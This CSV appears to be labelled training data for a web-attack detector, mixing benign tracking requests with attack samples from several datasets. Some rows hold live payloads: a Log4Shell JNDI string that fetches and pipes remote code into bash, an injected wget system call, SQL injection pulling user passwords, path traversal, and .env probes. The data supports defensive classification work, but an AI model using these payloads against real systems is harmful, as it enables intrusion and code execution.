"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"payload_family_hash","d170d12692d6a5c4de86f9b2","2","0","openappsec_legitimate","normal","norm_legitimate_001240|norm_legitimate_001252","GET","/privacy_sandbox/pixel/register/trigger/","id=3122845081335855&ev=Search&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&rl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&if=false&ts=1719747629205&cd[content_ids]=%5B%22FV8350%22%2C%22IF9212%22%2C%22JI1250%22%2C%"
"payload_family_hash","d195b307db6ec61b66df364f","2","0","openappsec_legitimate","normal","norm_legitimate_002388|norm_legitimate_002279","POST","/iev","entry=c~Gum.ChromeSyncframe.CookieRead.uid~1&entry=c~Gum.ChromeSyncframe.FragmentData.onetag.Bundle.Origin.undefined~1&entry=c~Gum.ChromeSyncframe.SidReadSuccess~1&entry=h~Gum.ChromeSyncframe.SidReadSuccessDuration~941"
"payload_family_hash","d261b091a46bdf1d3e61b2d9","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_001082|pos_owasp_modsec_000436","GET","/.env.save",""
"payload_family_hash","d27c74d780c5bb5c483f2844","2","0","openappsec_legitimate","normal","norm_legitimate_002171|norm_legitimate_002102","GET","/action/0","ti=4002941&Ver=2&mid=646ef04a-a6c9-4837-857f-fd99b71e9812&sid=428b9b903e9911efb457efdc28aa456f&vid=428bc2003e9911ef803bad7bacac9344&vids=0&msclkid=N&gc=USD&p=https%3A%2F%2Fwww.agoda.com%2Fstratosphere-hotel-casino-tower-bw-premier-collection%2Fhotel%2Flas-vegas-nv-us.html&sw=1920&sh=1080&sc=24&evt=c"
"payload_family_hash","d3bcd323ad37739f1b2fdf77","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001789|norm_modsec_learn_001180","GET","/","a=135092800&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=69525&ck=1&ref=https://www.nike.com/il/member/profile/login&ri=%7B%22web-shell-client%22:%221.39.0%22,%22shopClient%22:%221.133.0%22%7D"
"payload_family_hash","d3d11407cb9f95315ab251fa","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002644|norm_modsec_learn_001448","GET","/","r=dXM%3D&range=900-1718948"
"payload_family_hash","d4e4f7bfa568f62fe205853b","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002650|norm_modsec_learn_002651","GET","/","random=1660132674299&cv=9&fst=1660129200000&num=1&bg=ffffff&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=4&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa880&sendb=1&data=event%3Dform_submit&frm=0&url=https%3A%2F%2Fpremium.ynet.co.il%2FWeb%2FRegister&ref=https%3A%2F%2Fwww.ynet.co.il"
"payload_family_hash","d4ed5da1754f07f51e72dc3b","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002069|norm_modsec_learn_002070","GET","/","random=1660211716580&cv=9&fst=1660208400000&num=1&bg=ffffff&guid=ON&eid=376635470&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa880&sendb=1&data=event%3Dselect_content%3Bcontent_type%3Dproduct_component%3Bid%3D2175215&frm=0&url=https%3A%2F%2Fw"
"payload_family_hash","d4ed8ae190c195711d6d731d","2","0","openappsec_legitimate","normal","norm_legitimate_002084|norm_legitimate_002299","GET","/td/ga/rul","tid=G-C07L4VP9DZ&gacid=455635995.1720601296&gtm=45je4730v9137961602za200&dma=0&gcd=13l3l3l3l2&npa=0&pscdl=&aip=1&fledge=1&frm=0&z=1949473085"
"payload_family_hash","d6214a349926686e2bf2f663","2","0","openappsec_legitimate","normal","norm_legitimate_002149|norm_legitimate_002057","GET","/activityi;src=3525648;type=count0;cat=agoda0;u1=271631;u2=1;u3=7;u6=17072;u7=2024-07-20;u8=2024-07-24;ord=9819922280336.234",""
"payload_family_hash","d70f39a4179756766c00490c","2","0","openappsec_legitimate","normal","norm_legitimate_001121|norm_legitimate_001330","GET","/track","action=conversion&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&conversion_type=AddToCart&aepn=Add%20to%20Cart&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"payload_family_hash","d74c869a50bf50c6f81ddb92","2","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_002492|pos_owasp_modsec_002943","GET","/app/.env",""
"payload_family_hash","d78569dabf6c4029a70562e9","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000403|norm_modsec_learn_000313","GET","/","random=944255220&cv=9&fst=1660639795248&num=1&value=0&label=Uto4CMTQ-ZIBEKvNhO8C&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=10&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8f0&sendb=1&ig=1&data=ads_data_redaction%3Dtrue&frm=0&url=https%3A%2F%2Fwww"
"payload_family_hash","d793caa6a698caa744d938a8","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001189|norm_modsec_learn_001795","GET","/","a=657435108&v=1215.1253ab8&to=ZVdXbUtXXBIHVUNfXlwde1ZLW1MND0xSUmRAWxoT&rst=26520&ck=1&ref=https://www.nike.com/il/t/air-jordan-1-mid-shoe-xMNLGv/BQ6472-110"
"payload_family_hash","d80d78dc324d7f4054d864fa","2","0","openappsec_legitimate","normal","norm_legitimate_001251|norm_legitimate_001239","GET","/tr/","id=680435655455279&ev=Search&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&rl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&if=false&ts=1719747631078&cd[content_ids]=%5B%22FV8350%22%2C%22IF9212%22%2C%22JI1250%22%2C%2"
"payload_family_hash","d8fe189b08a856003a24c098","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001033|norm_modsec_learn_001032","GET","/","u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOVP.cTJ2lP9VGS3Hg0wL7VjZBAHgFo%26pid%3DApi&f=1"
"payload_family_hash","d9245ac64c54c52dc048d1cb","2","0","openappsec_legitimate","normal","norm_legitimate_002780|norm_legitimate_002719","POST","/gql/v1","bookingFlow=LEISURE"
"payload_family_hash","da0203ef2b056d105cedf538","2","1","openappsec_malicious","sqli","pos_malicious_001780|pos_malicious_001322","POST","/",""
"payload_family_hash","da05e389a3426975161b32ff","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002162|norm_modsec_learn_002163","GET","/","source_url=%2Fpin%2F589901251209908338%2F%3Fnic_v3%3D1a1WDa7xf&data=%7B%22options%22%3A%7B%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1663162897645"
"payload_family_hash","da7f2e36972e0443a5b9cc61","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001217|norm_modsec_learn_000694","GET","/","cm_dsp_id=24&external_user_id=d65dc02a-17e3-4374-b283-9daa56fe32e9&us_privacy=null&gdpr_consent=null&gdpr=null"
"payload_family_hash","dab561603d9c29f40497edfa","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002438|norm_modsec_learn_002437","GET","/","en=pre_d_eng_tb&tos=22580&scd=99&ssd=2&est=1660132597111&ver=35&isls=true&src=i&invt=12000&rv=1&tim=1660132619692&vi=1660132597110&ri=8179787ba5ee7675f2f0180a02b002d5&sd=v2_afe1fe3e22156d7de2bf25959c747e4b_fd14eba8-d4a8-475e-9ccc-ade6a1b8b828-tuct9ed226e_1660132597_1660132597_CIi3jgYQpvNBGPa69LyoMCA"
"payload_family_hash","db423f8f72e8a9f2cafacc7f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000287|norm_modsec_learn_000288","GET","/","pid=94d83373-73a7-4d9a-8720-60b54b2c9e2f&ev=PAGE_VIEW&v=2.3&rand=382581140&pl=www.att.com%2Fbuy%2Fphones%2Fapple-iphone-14-pro-max-128gb-gold.html"
"payload_family_hash","db61672c06a6da76034f4f3a","2","0","openappsec_legitimate","normal","norm_legitimate_001242|norm_legitimate_001253","GET","/tr/","id=3122845081335855&ev=PageView&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&rl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&if=false&ts=1719747629205&cd[page_type]=SEARCH&cd[page_name]=SEARCH%20RESULTS&cd[previous"
"payload_family_hash","dbca94b9d79a709b9b8fd4a3","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001203|norm_modsec_learn_001828","GET","/","appVersion=953&experienceVersion=953&uxid=com.nike.commerce.nikedotcom.web&locale=en_IL&backendEnvironment=identity&browser=Google%20Inc.&os=undefined&mobile=false&native=false&visit=1&visitor=2bac7ee2-6167-4dd0-9152-f278d455aec7&upmId=ffa85996-ca6e-4340-8463-aabd984bf5ac"
"payload_family_hash","dc9e84a4fef429526430785c","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000280|pos_owasp_modsec_001764","GET","/shell_exec.php",""
"payload_family_hash","dca70550c19b750bf31986ea","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000454|norm_modsec_learn_000453","GET","/","t=16605515344870.8402884074245256&c=1zyjhmab8ziolk8rkhp8sql6uhetdd&p=a4z72s&a=2airtuotjljd4ogblxxqquiq&o=www.bug.co.il&rt=1660551369412"
"payload_family_hash","ddd04ec36b53134d9b2a8d7e","2","1","owasp_modsecurity","owasp_php_injection:933160","pos_owasp_modsec_000939|pos_owasp_modsec_000789","GET","/d_53121ccb","start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o&ylabel&xrange=10:10&yrange=[33:system(%27wget%20http://d2g4pmidip2l0r1p42qgqr1pcphfm3ch9.oast.online%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
"payload_family_hash","de1846ed9c0b45a417be8de7","2","1","openappsec_malicious","traversal","pos_malicious_003001|pos_malicious_003025","GET","/","p=..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts"
"payload_family_hash","de31289ffc57ff543806b621","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002688|norm_modsec_learn_002687","GET","/","random=1660648022511&cv=9&fst=1660647600000&num=1&bg=ffffff&guid=ON&eid=376635470&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=26&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8f0&sendb=1&frm=0&url=https%3A%2F%2Ftoysrus.co.il%2Fpuzzle-and-creation%2Fpuzzle.html%3Fseries%3D22500&ref=https%3"
"payload_family_hash","de565da87bf818996a2cdd2f","2","0","openappsec_legitimate","normal","norm_legitimate_002070|norm_legitimate_002116","GET","/1168919/log/3/unip","en=pre_d_eng_tb&tos=4663&scd=0&ssd=1&est=1720601337472&ver=36&isls=true&src=i&invt=3000&msa=5331&rv=1&tim=1720601342137&mrir=tto&vi=1720601337465&ref=https%3A%2F%2Fwww.agoda.com%2F%3Fsite_id%3D1922889%26tag%3D3a518944-36fd-49e2-a05d-91bfa4a414a6%26gad_source%3D1%26device%3Dc%26network%3Dg%26adid%3D6"
"payload_family_hash","de80595aa1761433ce18c3dc","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000776|norm_modsec_learn_000777","GET","/","hl=iw&c=30&rt=r&pt=ji"
"payload_family_hash","de870af490401e19791b9d2e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000148|norm_modsec_learn_000149","GET","/","guid=ON&data=aam=9543587;9356173;17951059&is_vtc=1&random=3349201566"
"payload_family_hash","decf63f01d2d60d3baa2b2ee","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002317|norm_modsec_learn_002318","GET","/","xai=AKAOjstS6S9prN0_ORnHzPbJeNneyf8XwBXqLpgtBh2Gy9MhZWBjEn_c1z4gPW07-ewyUD20EhkVdvyAV2y_WY6mtnfuMyaG-7a1bP6WWhitg8_ILDeN5Lj_PCQoP2qOgnek8UqCRtmPj0tQf4U1EKWDZa5_wEr6ACvoHYGTn1DFlfaETVHOcMTMvA9C7nkV5zoIRxj9Z5w3s0jRh1mTJrSkk6bd1M7w8kMYU8p3hAesdnD6ZzMfgmrWHUH9QIlCKH3Un2Tb0qaPTzoTkaAmeGWh7PE-rYBEzEocga2A"
"payload_family_hash","df3bddd55adebce64965b4b9","2","0","openappsec_legitimate","normal","norm_legitimate_001029|norm_legitimate_001169","GET","/td/fls/rul/activityi;fledge=1;src=4599367;type=products;cat=prddtl;ord=1;num=9137207684021;npa=0;gac=UA-41273132-1%3AEAIaIQobChMI-JrG1Z6DhwMV9EpHAR17gA-NEAAYASAAEgK0aPD_BwE;auiddc=1339420619.1719747533;u1=PRODUCT%7CGRAND%20COURT%202.0%20SHOES%20KIDS%20(ID0741);u3=KIDS;u4=LIFESTYLE;u6=CLOUD%20WHITE%20%2F%20BLISS%20PINK%20%2F%20CLEAR%20PINK;u7=MDT59;u8=INLINE;u9=SPORTSWEAR;u10=;u11=0;u12=0;u14=FALSE;u16=SHOES;u17=MDT59;u18=40.00;u19=ID0741;u21=FULL%20PRICE;u23=;u25=TEST;u26=40;u28=GRAND%20COURT%202.0%20SHOES%20KIDS;u30=US;u31=NEW;gdid=dYmQxMT;ps=1;pcor=835796677;uaa=x86;uab=64;uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127;uamb=0;uam=;uap=Windows;uapv=12.0.0;uaw=0;frm=0;gtm=45fe46q0v9156756886za200;gcs=G111;gcd=13t3t3t3t5;dma=0;tag_exp=0;epver=2;match_id=8028816474865468;~oref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html",""
"payload_family_hash","dfef5bf3281c337ceba933f5","2","0","csic_2010","csic_normal","norm_csic_001052|norm_csic_001093","GET","/tienda1/publico/registro.jsp","modo=registro&login=ambrosi&password=aguijon%21ear&nombre=Nelba&apellidos=Bassaga%F1a+Gifra&email=ping.kasatsu%40asdn.cl&dni=15013152V&direccion=Obispo+Diego+Aponte%2C+S%2FN+&ciudad=Mart%EDn+del+R%EDo&cp=08719&provincia=Madrid&ntc=5388028127449105&B1=Registrar"
"payload_family_hash","e1190ba58dea00ae1a078422","2","0","openappsec_legitimate","normal","norm_legitimate_001641|norm_legitimate_001623","POST","/signin/v1/audit",""
"payload_family_hash","e122767a00a48c8f995c5c72","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002223|norm_modsec_learn_002224","GET","/","v=1&_v=j96&a=1756976610&t=event&_s=18&dl=https%3A%2F%2Fwww.pizzahut.co.il%2Fshop%2F&ul=en-us&de=UTF-8&dt=%D7%94%D7%96%D7%9E%D7%A0%D7%95%D7%AA%20%D7%90%D7%95%D7%A0%D7%9C%D7%99%D7%99%D7%9F%20-%20%D7%A4%D7%99%D7%A6%D7%94%20%D7%94%D7%90%D7%98%20-%20PizzaHut&sd=24-bit&sr=1920x1080&vp=1914x969&je=0&ec=eng"
"payload_family_hash","e143dbc791655fd970048488","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000182|norm_modsec_learn_000181","GET","/","id=AW-1036745755&cv=1&v=3&t=t&pid=1601347498&rv=9j0&es=1&e=*&eid=29&u=C&ut=AAB&tc=1&epr=1AW&z=0"
"payload_family_hash","e165fb71747ca81cd9744abe","2","0","openappsec_legitimate","normal","norm_legitimate_001021|norm_legitimate_001130","GET","/trk/4/s/a-24f48522/p/adidas.us/1817534923-0","mr=t1715147729&mi=%275.383122870.1719747512909%27&cs=!t&e=!(viewProduct,viewPage,gr,gt)&p=!((productId:ID0741))&pt=PDP&bc=!(%27HOME+%3E+KIDS+%3E+SHOES+%3E+GRAND+COURT+2.0+SHOES+KIDS%27)&r=%27%27&sw=1920&sh=1080&sc=24&j=!f&tg=!(!(34474,%2749632376869808639270227858961487525092%27))&u=%27https://www.a"
"payload_family_hash","e1a3ff3989931e495fb4f5be","2","0","openappsec_legitimate","normal","norm_legitimate_000779|norm_legitimate_000902","GET","/api/config.json","key=W5KYL-VGT59-BFM62-773LD-CAHF6&d=www.adidas.com&t=5732492&v=1.792.0&if=&sl=0&si=450aeaa3-f5a3-4dee-b923-513b4b76c49c-sfw5o0&bcn=%2F%2F173bf10e.akstat.io%2F&plugins=AK,ConfigOverride,Continuity,PageParams,IFrameDelay,AutoXHR,SPA,History,Angular,Backbone,Ember,RT,CrossDomain,BW,PaintTiming,Navigati"
"payload_family_hash","e23e5cdda6b3e1de71bb1b9d","2","1","openappsec_malicious","sqli","pos_malicious_002022|pos_malicious_001564","POST","/",""
"payload_family_hash","e2afcfd5bfd2ab559e49c7ae","2","1","openappsec_malicious","log4shell","pos_malicious_001057|pos_malicious_001167","GET","/","p=%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7D%24%7Blower%3Aa%7D%24%7Blower%3Ap%7D%3A/fake.domain%3A12344/Basic/Command/Base64/KHdnZXQgLU8gLSBodHRwOi8vZmFrZS5kb21haW46ODAwNS9hY2N8fGN1cmwgLW8gLSBodHRwOi8vZmFrZS5kb21haW46ODAwNS9hY2MpfC9iaW4vYmFzaCA%3D%7D"
"payload_family_hash","e2b6b5e626e3f99516092c16","2","1","exploitdb","sqli","pos_luongvd_001502|pos_luongvd_001500","GET","/index.php","option=com_pinboard&Itemid=35&action=showpic&task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--"
"payload_family_hash","e2bacb853a7b5dad0558ae98","2","0","openappsec_legitimate","normal","norm_legitimate_002402|norm_legitimate_001541","POST","/xoplatform/logger/api/logger","disableSetCookie=true"
"payload_family_hash","e3c10f0219da1a2cebee0626","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_002142|pos_owasp_modsec_000938","GET","/dev/.env",""
"payload_family_hash","e3c239eadab06576be29a59f","2","0","openappsec_legitimate","normal","norm_legitimate_002542|norm_legitimate_002547","POST","/tracking/jitney/logging/messages",""
"payload_family_hash","e453f46ba86b117628cfaeb8","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001618|norm_modsec_learn_002980","GET","/","ts=1660569696"
"payload_family_hash","e45f62c52407f30fb37dbbb8","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002464|norm_modsec_learn_002463","GET","/","geocode=48.5,2.0&h=320&w=568&lod=6&product=radarFcst&map=light&format=jpg&language=en&apiKey=PRESENT&a=0&ts=1663158600&fts=1663181100"
"payload_family_hash","e570ee34a3982f4e28463e3d","2","1","openappsec_malicious","sqli","pos_malicious_001960|pos_malicious_001502","POST","/",""
"payload_family_hash","e5aacde895ed30a64abb00ef","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002200|norm_modsec_learn_000475","GET","/","transactionId=41fb3094-49e9-4046-91a3-100a299cc680"
"payload_family_hash","e5d7550d9767d115596fc70a","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002127|norm_modsec_learn_002123","GET","/","random=765659181&cv=9&fst=1660541154747&num=1&npa=1&label=kGgWCMHGir4CEI78zqIC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&gclaw=Cj0KCQjwuuKXBhCRARIsAC-gM0ioQ9yMxw_TVF2RXZ5DHfcSGPiWs7OETmoAZ8"
"payload_family_hash","e62936e492df0f91a6b3cc0c","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002892|norm_modsec_learn_002863","GET","/","vc=1.1&vv=1.1&ctid=GTM-5T9932C&idx=9&event_name=gtm.click&variable_name=dlv%20-%20ecommerce.impressions&channels=&tag_names=&dlKey=ecommerce.impressions&dlValue=undefined&cond=required&condValue=true&url=https%3A%2F%2Fstoryonline.co.il%2Fcollections%2F1-1-%25D7%25A2%25D7%259C-%25D7%25A7%25D7%2595%25"
"payload_family_hash","e64580c0e6497257be76437e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002172|norm_modsec_learn_002171","GET","/","t=1659539836801&imwidth=90"
"payload_family_hash","e69c8d47d08832129bfb0894","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000316|norm_modsec_learn_000333","GET","/","random=1590349382&cv=9&fst=1660540153804&num=1&label=6uFjCJWY7-sBEKmj5IYD&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=5&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa880&sendb=1&ig=1&data=event%3Dpage_view%3Bpage_path%3D%2F%3Bpage_title%3DTHREE%20SI"
"payload_family_hash","e7ea233f8337bcfe206c0130","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001613|norm_modsec_learn_001609","GET","/","token=PRESENT&tm=5800&eT=0&widgetWidth=306&widgetHeight=360&widgetX=389&widgetY=1837&wRV=2000857&pVis=1&lsd=d68b8d37-ff68-48e2-b9c0-e5c62d87e68b&eIdx=&oo=false&ab=0&wl=0"
"payload_family_hash","e825483c9b634aa4c26a820c","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000504|norm_modsec_learn_000503","GET","/","v=1&_v=j96&a=1314735882&t=event&_s=15&dl=https%3A%2F%2Fwww.ae.com%2Fus%2Fen&dp=%2Fus%2Fen%2Fs%2Ft%2Bshirt&ul=en-us&de=UTF-8&dt=&sd=24-bit&sr=1920x1080&vp=1903x969&je=0&ec=ui&ea=search&el=s%3At_shirt&_u=6GBAAUABAAAAAC~&jid=&gjid=&cid=1943815864.1660209877&uid=&tid=UA-3427016-1&_gid=951496461.16602098"
"payload_family_hash","e86a7ab0b9c072458f39d64a","2","0","openappsec_legitimate","normal","norm_legitimate_002139|norm_legitimate_002019","POST","/graphql/search",""
"payload_family_hash","e892d7629efc03453e9faec3","2","0","openappsec_legitimate","normal","norm_legitimate_001873|norm_legitimate_001872","POST","/bulk",""
"payload_family_hash","e8978a27d2b3c2b4342519d6","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001282|norm_modsec_learn_001283","GET","/","fmt=jpeg&qlt=70,1&op_sharpen=0&resMode=sharp2&op_usm=0.8,1,10,0&fit=crop,0&wid=1050&hei=1400"
"payload_family_hash","e8f4387bd566a6fb42fefc98","2","1","openappsec_malicious","sqli","pos_malicious_002144|pos_malicious_001686","POST","/",""
"payload_family_hash","e915c4b18aab03444d2e457f","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001101|norm_modsec_learn_002861","GET","/","v=9-32680a36db&secure=1&cachedVariantChoices=W10-&isPurposePreview=0&eventMetadataExperiment=newMeta&inmobi=0"
"payload_family_hash","e94befbff6dafd5cc90fceed","2","0","openappsec_legitimate","normal","norm_legitimate_001326|norm_legitimate_001117","GET","/v3/conversion","action=conversion&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&conversion_type=AddToCart&aepn=Add%20to%20Cart&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html%3FforceSelSize%3D6.5&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"payload_family_hash","e96bc14b782074e7086e2be9","2","0","openappsec_legitimate","normal","norm_legitimate_002466|norm_legitimate_002464","POST","/metrics/ui",""
